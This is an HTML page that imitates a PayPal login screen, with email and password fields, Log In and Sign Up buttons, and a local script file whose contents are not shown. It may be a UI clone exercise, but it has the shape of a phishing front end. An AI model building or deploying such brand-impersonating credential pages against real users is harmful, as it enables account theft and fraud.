<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="apple-touch-icon" sizes="180x180" href="./fev/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="./fev/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="./fev/favicon-16x16.png">
    <link rel="manifest" href="./fev/site.webmanifest">


    <link rel="stylesheet" href="style.css">
    <title>Log in to your PayPal account</title>
</head>

<body>
    <div class="main">
        <div class="container">
            <div class="logo">
                <img src="logo.png" alt="logo-fetch-error">
            </div>
            <div id="form">
                <input type="email" name="email" id="email" placeholder="Email or mobile number" autofocus>
                <input type="password" name="password" id="password" placeholder="Password">
                <button id="login">
                    Log In
                </button>
                <p><a href="#" id="forget">Forgot your email or password?</a></p>
                <hr>
                <button id="signup">
                    Sign Up
                </button>
            </div>
        </div>
    </div>
    <script src="http://ajax.googleapis.com/ajax/libs/jquery/1.7.1/jquery.min.js" type="text/javascript"></script>
    <script src="index.js"></script>
</body>

</html>
